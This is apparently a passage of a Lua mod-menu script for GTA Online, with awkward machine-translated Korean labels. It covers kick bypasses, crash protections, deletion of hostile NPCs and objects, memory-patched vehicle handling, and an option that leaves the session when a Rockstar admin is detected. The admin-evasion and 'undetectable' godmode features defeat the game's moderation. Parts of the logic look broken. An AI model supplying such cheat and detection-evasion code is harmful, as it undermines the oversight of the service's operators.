menu.toggle(bypasskick, "방법 V1", {}, "그것은 당신을 막는 사람을 쫓아내는 데 제한된 시간을 줍니다.", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_commands("nobgscript on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        util.toast("활성화, 이제 세션에 들어가서 킥을 준비합니다.")
    else
        menu.trigger_commands("nobgscript off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        util.toast("준비, 모두 해제.")
    end
end)

menu.toggle(bypasskick, "방법 V2", {}, "조금 더 기능적이긴 하지만 더 많은 네트워크 오류가 있습니다.", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
    local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
    local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
    local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
    if on_toggle then
        menu.trigger_commands("nobgscript on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_command(BlockBailing, "on")
        menu.trigger_command(BlockBailing2, "on")
        menu.trigger_command(BlockBailing3, "on")
        menu.trigger_command(BlockBailing4, "on")
        util.toast("활성화, 이제 세션에 들어가서 킥을 준비합니다.")
    else
        menu.trigger_commands("nobgscript off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_command(BlockBailing3, "off")
        util.toast("준비, 모두 해제.")
    end
end)

menu.toggle(bypasskick, "방법 V3", {}, "보다 기능적인 방법이지만 개발자의 경우 모든 네트워크 이벤트에 대한 알림을 받게 됩니다.", function(on_toggle)
local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
local ShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Enabled")
local BlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
local UnShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Disabled")
local UnBlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
if on_toggle then
    menu.trigger_commands("nobgscript on")
    menu.trigger_command(BlockIncSyncs)
    menu.trigger_command(BlockNetEvents)
    menu.trigger_command(BlockBailing, "on")
    menu.trigger_command(BlockBailing2, "on")
    menu.trigger_command(BlockBailing3, "on")
    menu.trigger_command(BlockBailing4, "on")
    menu.trigger_command(ShowNotis)
    menu.trigger_command(BlockRaw)
    util.toast("활성화, 이제 세션에 들어가서 킥을 준비합니다.")
else
    menu.trigger_commands("nobgscript off")
    menu.trigger_command(UnblockIncSyncs)
    menu.trigger_command(UnblockNetEvents)
    menu.trigger_command(BlockBailing3, "off")
    menu.trigger_command(UnShowNotis)
    menu.trigger_command(UnBlockRaw)
    util.toast("준비, 모두 해제.")
end
end)

menu.toggle(bypasskick, "방법 V4", {}, "게임을 깰 수도 있고, 자신의 위험을 무릅쓰고", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
    local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
    local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
    local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
    local ShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Enabled")
    local BlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Disabled")
    local UnBlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local DontAsk = menu.ref_by_path("Online>Transitions>Speed Up>Don't Ask For Permission To Spawn")
    if on_toggle then
        menu.trigger_commands("nobgscript on")
        menu.trigger_commands("skipbroadcast on")
        menu.trigger_commands("speedupspawn on")
        menu.trigger_commands("speedupfmmc on")
        menu.trigger_commands("skipswoopdown on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_command(BlockBailing, "on")
        menu.trigger_command(BlockBailing2, "on")
        menu.trigger_command(BlockBailing3, "on")
        menu.trigger_command(BlockBailing4, "on")
        menu.trigger_command(ShowNotis)
        menu.trigger_command(BlockRaw)
        menu.trigger_command(DontAsk, "on")
        util.toast("활성화, 이제 세션에 들어가서 킥을 준비합니다.")
    else
        menu.trigger_commands("nobgscript off")
        menu.trigger_commands("skipbroadcast off")
        menu.trigger_commands("speedupspawn off")
        menu.trigger_commands("speedupfmmc off")
        menu.trigger_commands("skipswoopdown off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_command(BlockBailing3, "off")
        menu.trigger_command(UnShowNotis)
        menu.trigger_command(UnBlockRaw)
        menu.trigger_command(DontAsk, "off")
        util.toast("준비, 모두 해제.")
    end
end)

--------------------------------------------------------------------------------------------------------------------------------
--Protecciones

menu.action(protects, "모든 소리를 멈춰라", {"stopsounds"}, "", function()
    for i=-1,100 do
        AUDIO.STOP_SOUND(i)
        AUDIO.RELEASE_SOUND_ID(i)
    end
end)

menu.action(protects, "링을 떼다.", {}, "벨이 울리지 않게 휴대폰의 링턴을 떼어내라.", function()
    if AUDIO.IS_PED_RINGTONE_PLAYING then
        for i=-1, 50 do
            AUDIO.STOP_PED_RINGTONE(i)
        end
    end
end)

local quitarf = menu.list(protects, "부동액 방법")

menu.action(quitarf, "프리즈를 제거하다. V1", {}, "원주민 몇 명을 리셋해서 프리제 상태를 없애도록 해", function()
    --local playerpos = ENTITY.GET_ENTITY_COORDS(ped, false)
    local player = PLAYER.PLAYER_PED_ID()
    ENTITY.FREEZE_ENTITY_POSITION(player, false)
    MISC.OVERRIDE_FREEZE_FLAGS()
    menu.trigger_commands("rcleararea")
end)

menu.action(quitarf, "프리즈를 제거하다. V2 'Test'", {}, "원주민 몇 명을 다시 시작해 보세요. 이 방법으로는 당신은 죽을 거예요.", function()
    --local playerpos = ENTITY.GET_ENTITY_COORDS(ped, false)
    local player = PLAYER.PLAYER_PED_ID()
    ENTITY.FREEZE_ENTITY_POSITION(player, false)
    ENTITY.SET_ENTITY_COORDS(player, 1, 0, 0, 1, false)
    MISC.OVERRIDE_FREEZE_FLAGS()
    menu.trigger_commands("rcleararea")
end)

menu.toggle(protects, "팬코 모드", {"panic"}, "이것은 어떤 대가를 치르더라도 게임에서 모든 종류의 이벤트를 제거함으로써 안티 크래쉬 모드를 렌더링합니다.", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_commands("desyncall on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        menu.trigger_commands("desyncall off")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end)

--menu.toggle_loop(protects, "블루콰이어 크래시호스/킥", {}, "메뉴 보호를 활성화하여 크라슈나 킥을 차단하도록 하십시오.", function(on)
--end)


menu.toggle_loop(protects, "R*의 지배하에 있다.", {}, "R*의 어드바이저가 감지되면 세션이 바뀝니다.", function(on)
    bailOnAdminJoin = on
end)

if bailOnAdminJoin then
    if players.is_marked_as_admin(player_id) then
        util.toast(players.get_name(player_id) .. " 또 다른 세션이 있습니다.")
        menu.trigger_commands("quickbail")
        return
    end
end

menu.toggle_loop(protects, "트랜잭션 에러 차단 'Test'", {}, "그것은 아마도 실수를 수반할 것이고, 책임하에 사용하는 것이", function(on_toggle)
--    local TransactionError = menu.ref_by_path("Online>Protections>Events>Transaction Error Event>Block")
--    local TransactionErrorV = menu.ref_by_path("Online>Protections>Events>Transaction Error Event>Notification")
    if on_toggle then
        menu.trigger_command(TransactionError, "on")
        menu.trigger_command(TransactionErrorV, "on")
        for i = 1, 100 do
            menu.trigger_commands("removeloader")
        end
--        --util.toast("No es mi culpa el error del log, esperen a que Stand lo arregle")
    end
end)

--menu.toggle_loop(protects, "Bloquear Fuego/Lag", {}, "", function()
--    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
--    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
--    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
--end)

menu.toggle_loop(protects, "PFTX/라그 입자를 차단합니다.", {}, "", function()
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
end)

menu.toggle_loop(protects, "Anti 비스트", {}, "스탠드 등으로 짐승이 되는 것을 방지합니다.", function()
    if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_hunt_the_beast")) > 0 then
        local host
        repeat
            host = NETWORK.NETWORK_GET_HOST_OF_SCRIPT("am_hunt_the_beast", -1, 0)
            util.yield()
        until host ~= -1
        util.toast(players.get_name(host).." 스타드 헌트 더 비스트 킬링 스크립트...")
        menu.trigger_command(menu.ref_by_path("Online>Session>Session Scripts>Hunt the Beast>Stop Script"))
    end
end)

local values = {
    [0] = 0,
    [1] = 50,
    [2] = 88,
    [3] = 160,
    [4] = 208,
}

local anticage = menu.list(protects, "반자울라 보호", {}, "")
local alpha = 160
menu.slider(anticage, "케이지 알파", {"cagealpha"}, "새장의 투명성. 0이 되면 못 볼 거예요.", 0, #values, 3, 1, function(amount)
    alpha = values[amount]
end)

menu.toggle_loop(anticage, "Anti 케이지", {"anticage"}, "", function()
    local user = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
    local my_ents = {user, veh}
    for i, obj_ptr in ipairs(entities.get_all_objects_as_pointers()) do
        local net_obj = memory.read_long(obj_ptr + 0xd0)
        if net_obj == 0 or memory.read_byte(net_obj + 0x49) == players.user() then
            continue
        end
        local obj_handle = entities.pointer_to_handle(obj_ptr)
        CAM._DISABLE_CAM_COLLISION_FOR_ENTITY(obj_handle)
        for i, data in ipairs(my_ents) do
            if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha > 0 then
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj_handle, data, false)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, obj_handle, false)
                ENTITY.SET_ENTITY_ALPHA(obj_handle, alpha, false)
            end
            if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha == 0 then
                entities.delete_by_handle(obj_handle)
            end
        end
        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(obj_handle)
    end
end)

fmugger = menu.list(protects, "객체/NPC", {}, "")

local anti_mugger = menu.list(protects, "강도방지")

menu.toggle_loop(anti_mugger, "미를 향해", {}, "머거스 차단은 당신을 향한 것입니다..", function() -- thx nowiry for improving my method :D
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if (memory.read_int(sender) ~= player and memory.read_int(target) == player 
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId))) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("블록버스터 머거 프롬 " .. players.get_name(memory.read_int(sender)))
            end
        end)
    end
end)

menu.toggle_loop(anti_mugger, "다른 사람이요", {}, "머거스가 다른 사람을 공격한다.", function()
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if memory.read_int(target) ~= player and memory.read_int(sender) ~= player
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId)) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("블락 머거 센티비 " .. players.get_name(memory.read_int(sender)) .. " to " .. players.get_name(memory.read_int(target)))
            end
        end)
    end
end)

menu.toggle_loop(fmugger, "객체 F/", {"ghostobjects"}, "물체와의 충돌을 무력화시킵니다.", function()
    local user = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
    local my_ents = {user, veh}
    for i, obj_ptr in ipairs(entities.get_all_objects_as_pointers()) do
        local net_obj = memory.read_long(obj_ptr + 0xd0)
        local obj_handle = entities.pointer_to_handle(obj_ptr)
        ENTITY.SET_ENTITY_ALPHA(obj_handle, 255, false)
        CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(obj_handle)
        for i, data in ipairs(my_ents) do
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj_handle, data, false)
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, obj_handle, false)  
        end
        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(obj_handle)
    end
end)

menu.toggle_loop(fmugger, "차량 F/", {"ghostvehicles"}, "그것은 자동차와의 충돌을 무력화시킨다.", function()
    local user = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
    local my_ents = {user, veh}
    for i, veh_ptr in ipairs(entities.get_all_vehicles_as_pointers()) do
        local net_veh = memory.read_long(veh_ptr + 0xd0)
        local veh_handle = entities.pointer_to_handle(veh_ptr)
        ENTITY.SET_ENTITY_ALPHA(veh_handle, 255, false)
        CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(veh_handle)
        for i, data in ipairs(my_ents) do
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(veh_handle, data, false)
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, veh_handle, false)  
        end
        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(veh_handle)
    end
end)

local pool_limiter = menu.list(protects, "리미티드 풀", {}, "")
local ped_limit = 175
menu.slider(pool_limiter, "리미티드 풀/NPC", {"pedlimit"}, "", 0, 256, 175, 1, function(amount)
    ped_limit = amount
end)

local veh_limit = 200
menu.slider(pool_limiter, "리미티드 풀/차량", {"vehlimit"}, "", 0, 300, 150, 1, function(amount)
    veh_limit = amount
end)

local obj_limit = 750
menu.slider(pool_limiter, "리미티드 풀/객체", {"objlimit"}, "", 0, 2300, 750, 1, function(amount)
    obj_limit = amount
end)

local projectile_limit = 25
menu.slider(pool_limiter, "리미티드 풀/프로젝트", {"projlimit"}, "", 0, 50, 25, 1, function(amount)
    projectile_limit = amount
end)

menu.toggle_loop(pool_limiter, "격려 리미티드 풀", {}, "", function()
    local ped_count = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        util.yield()
        if ped ~= players.user_ped() then
            ped_count += 1
        end
        if ped_count >= ped_limit then
            for _, ped in pairs(entities.get_all_peds_as_handles()) do
                util.yield()
                entities.delete_by_handle(ped)
            end
            util.toast("NPC 볼 정리 중...")
        end
    end
    local veh__count = 0
    for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        util.yield()
        veh__count += 1
        if veh__count >= veh_limit then
            for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
                entities.delete_by_handle(veh)
            end
            util.toast("차량 트렁크 청소 중...")
        end
    end
    local obj_count = 0
    for _, obj in pairs(entities.get_all_objects_as_handles()) do
        util.yield()
        obj_count += 1
        if obj_count >= obj_limit then
            for _, obj in pairs(entities.get_all_objects_as_handles()) do
                entities.delete_by_handle(obj)
            end
            util.toast("물건 봉투를 치우는 중...")
        end
    end
end)

--------------------------------------------------------------------------------------------------------------------------------
-- Coches
menu.toggle_loop(vehicles, "침묵의 무적모드", {}, "대부분의 메뉴에서는 감지되지 않을 것입니다.", function()
    ENTITY.SET_ENTITY_PROOFS(entities.get_user_vehicle_as_handle(), true, true, true, true, true, 0, 0, true)
    end, function() ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(players.user(), false), false, false, false, false, false, 0, 0, false)
end)

menu.toggle_loop(vehicles, "지시등", {}, "", function()
    if(PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false)) then
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)

        local left = PAD.IS_CONTROL_PRESSED(34, 34)
        local right = PAD.IS_CONTROL_PRESSED(35, 35)
        local rear = PAD.IS_CONTROL_PRESSED(130, 130)

        if left and not right and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
        elseif right and not left and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        elseif rear and not left and not right then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        else
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, false)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, false)
        end
    end
end)

modificaciones = menu.list(vehicles, "차량 변경", {}, "")

-- menu.click_slider_float(modificaciones, "서스펜션", {"suspensionheight"}, "", -100, 100, 0, 1, function(value)
--     value/=100
--     local player = players.user_ped()
--     local pos = ENTITY.GET_ENTITY_COORDS(player, false)
--     local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
--     if VehicleHandle == 0 then return end
--     local CAutomobile = entities.handle_to_pointer(VehicleHandle)
--     local CHandlingData = memory.read_long(CAutomobile + 0x0938)
--     memory.write_float(CHandlingData + 0x00D0, value)
--     ENTITY.SET_ENTITY_COORDS_NO_OFFSET(VehicleHandle, pos.x, pos.y, pos.z + 2.8, false, false, false) -- Dropping vehicle so the suspension updates
-- end)

-- menu.click_slider_float(modificaciones, "토크", {"torque"}, "", 0, 1000, 100, 10, function(value)
--     value/=100
--     local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
--     if VehicleHandle == 0 then return end
--     local CAutomobile = entities.handle_to_pointer(VehicleHandle)
--     local CHandlingData = memory.read_long(CAutomobile + 0x0938)
--     memory.write_float(CHandlingData + 0x004C, value)
-- end)

-- menu.click_slider_float(modificaciones, "업시프트", {"upshift"}, "", 0, 500, 100, 10, function(value)
--     value/=100
--     local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
--     if VehicleHandle == 0 then return end
--     local CAutomobile = entities.handle_to_pointer(VehicleHandle)
--     local CHandlingData = memory.read_long(CAutomobile + 0x0938)
--     memory.write_float(CHandlingData + 0x0058, value)
-- end)

-- menu.click_slider_float(modificaciones, "다운시프트", {"downshift"}, "", 0, 500, 100, 10, function(value)
--     value/=100
--     local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
--     if VehicleHandle == 0 then return end
--     local CAutomobile = entities.handle_to_pointer(VehicleHandle)
--     local CHandlingData = memory.read_long(CAutomobile + 0x0938)
--     memory.write_float(CHandlingData + 0x005C, value)
-- end)

-- menu.click_slider_float(modificaciones, "커브 곱셈", {"curve"}, "", 0, 500, 100, 10, function(value)
--     value/=100
--     local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
--     if VehicleHandle == 0 then return end
--     local CAutomobile = entities.handle_to_pointer(VehicleHandle)
--     local CHandlingData = memory.read_long(CAutomobile + 0x0938)
--     memory.write_float(CHandlingData + 0x0094, value)
-- end)

menu.toggle_loop(modificaciones, "랜덤 개량", {}, "Only works는 차량입니다. 인포메이션에서요.", function()
    local mod_types = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 12, 14, 15, 16, 23, 24, 25, 27, 28, 30, 33, 35, 38, 48}
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) then
        for i, upgrades in ipairs(mod_types) do
            VEHICLE.SET_VEHICLE_MOD(entities.get_user_vehicle_as_handle(), upgrades, math.random(0, 20), false)
        end
    end
    util.yield(100)
end)

local rapid_khanjali
rapid_khanjali = menu.toggle_loop(modificaciones, "칸잘리 파이어", {}, "", function()
    local player_veh = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
    if ENTITY.GET_ENTITY_MODEL(player_veh) == util.joaat("khanjali") then
        VEHICLE.SET_VEHICLE_MOD(player_veh, 10, math.random(-1, 0), false)
    else
        util.toast("칸잘리 안으로 들어가라.")
        menu.trigger_command(rapid_khanjali, "off")
    end
end)

player_cur_car = 0

menu.toggle_loop(modificaciones, "방탄", {}, "", function(on)
    local play = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    if on then
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(play), true, true, true, true, true, false, false, true)
    else
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(play), false, false, false, false, false, false, false, false)
    end
end)

infcms = false
menu.toggle(modificaciones, "무한대 대응책", {"infinitecms"}, "끝없는 대응책을 강구하다.", function(on)
    infcms = on
end)

if player_cur_car ~= 0 then
    --if racemode then
    --    VEHICLE.SET_VEHICLE_IS_RACING(player_cur_car, true)
    --end

    if infcms then
        if VEHICLE.GET_VEHICLE_COUNTERMEASURE_AMMO(player_cur_car) < 100 then
            VEHICLE.SET_VEHICLE_COUNTERMEASURE_AMMO(player_cur_car, 100)
        end
    end

    --if shift_drift then
    --    if PAD.IS_CONTROL_PRESSED(21, 21) then
    --        VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, true)
    --        VEHICLE._SET_VEHICLE_REDUCE_TRACTION(player_cur_car, 0.0)
    --    else
    --        VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, false)
    --    end
    --end
end

--force_cm = false
--menu.toggle(vehicles, "Forzar Contramedidas", {"forcecms"}, "Fuerza las contramedidas en cualquier vehiculo a la tecla del claxon.", function(on)
--    force_cm = on
--    menu.trigger_commands("getgunsflaregun")
--end)

--if player_cur_car ~= 0 and force_cm then
--    if PAD.IS_CONTROL_PRESSED(46, 46) then
--        local target = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(player_id), math.random(-5, 5), -30.0, math.random(-5, 5))
--        --MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target.x, target.y, target.z, target.x, target.y, target.z, 300.0, true, -1355376991, PLAYER.PLAYER_PED_ID(player_id), true, false, 100.0)
--        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target.x, target.y, target.z, target.x, target.y, target.z, 100.0, true, 1198879012, PLAYER.PLAYER_PED_ID(player_id), true, false, 100.0)
--    end
--end

--------------------------------------------------------------------------------------------------------------------------------------------------------
-- Real Helicopter Mode Start

get_vtable_entry_pointer = function(address, index)
    return memory.read_long(memory.read_long(address) + (8 * index))
end
get_sub_handling_types = function(vehicle, type)
    local veh_handling_address = memory.read_long(entities.handle_to_pointer(vehicle) + 0x918)
    local sub_handling_array = memory.read_long(veh_handling_address + 0x0158)
    local sub_handling_count = memory.read_ushort(veh_handling_address + 0x0160)
    local types = {registerd = sub_handling_count, found = 0}
    for i = 0, sub_handling_count - 1, 1 do
        local sub_handling_data = memory.read_long(sub_handling_array + 8 * i)
        if sub_handling_data ~= 0 then
            local GetSubHandlingType_address = get_vtable_entry_pointer(sub_handling_data, 2)
            local result = util.call_foreign_function(GetSubHandlingType_address, sub_handling_data)
            if type and type == result then return sub_handling_data end
            types[#types+1] = {type = result, address = sub_handling_data}
            types.found = types.found + 1
        end
    end
    if type then return nil else return types end
end
local thrust_offset = 0x8
local better_heli_handling_offsets = {
    ["fYawMult"] = 0x18, -- dont remember
    ["fYawStabilise"] = 0x20, --minor stabalization
    ["fSideSlipMult"] = 0x24, --minor stabalizaztion
    ["fRollStabilise"] = 0x30, --minor stabalization
    ["fAttackLiftMult"] = 0x48, --disables most of it
    ["fAttackDiveMult"] = 0x4C, --disables most of the other axis
    ["fWindMult"] = 0x58, --helps with removing some jitter
    ["fPitchStabilise"] = 0x3C --idk what it does but it seems to help
}

realheli = menu.list(vehicles, "헬리콥터", {}, "헬리콥터의 실제 제어 옵션")

menu.slider_float(realheli, "왕립 헬리콥터 파워", {"heliThrust"}, "헬리 파워", 0, 1000, 50, 1, function (value)
    local CflyingHandling = get_sub_handling_types(entities.get_user_vehicle_as_handle(), 1)
    if CflyingHandling then
        memory.write_float(CflyingHandling + thrust_offset, value * 0.01)
    else
        util.toast("에러가 헬리에 들어간다")
    end
end)

menu.action(realheli, "실제 헬리콥터 모드", {"betterheli"}, "실제 작동 모드를 위해 vtol의 수직 안정화를 비활성화합니다.", function ()
    local CflyingHandling = get_sub_handling_types(entities.get_user_vehicle_as_handle(), 1)
    if CflyingHandling then
        for _, offset in pairs(better_heli_handling_offsets) do
            memory.write_float(CflyingHandling + offset, 0)
        end
        util.toast("충돌하지 않도록 노력하십시오.")
    else
        util.toast("에러가 헬리에 들어간다")
    end
end)

-- Real Helicopter Mode End
--------------------------------------------------------------------------------------------------------------------------------------------------------
--Impulse SportMode start


sportmode = menu.list(vehicles, "스포츠모드", {}, "임푸슬에 대해 우리 모두가 기억할 스포츠 모드 :'3")

PEDD = {
	["GET_VEHICLE_PED_IS_IN"]=function(--[[Ped (int)]] ped,--[[BOOL (bool)]] includeLastVehicle)native_invoker.begin_call();native_invoker.push_arg_int(ped);native_invoker.push_arg_bool(includeLastVehicle);native_invoker.end_call("9A9112A0FE9A4713");return native_invoker.get_return_value_int();end,
}
PLAYERR = {
	["PLAYER_PED_ID"]=function()native_invoker.begin_call();native_invoker.end_call("D80958FC74E988A6");return native_invoker.get_return_value_int();end,
}
CAMM = {
	["GET_GAMEPLAY_CAM_ROT"]=function(--[[int]] rotationOrder)native_invoker.begin_call();native_invoker.push_arg_int(rotationOrder);native_invoker.end_call("837765A25378F0BB");return native_invoker.get_return_value_vector3();end,
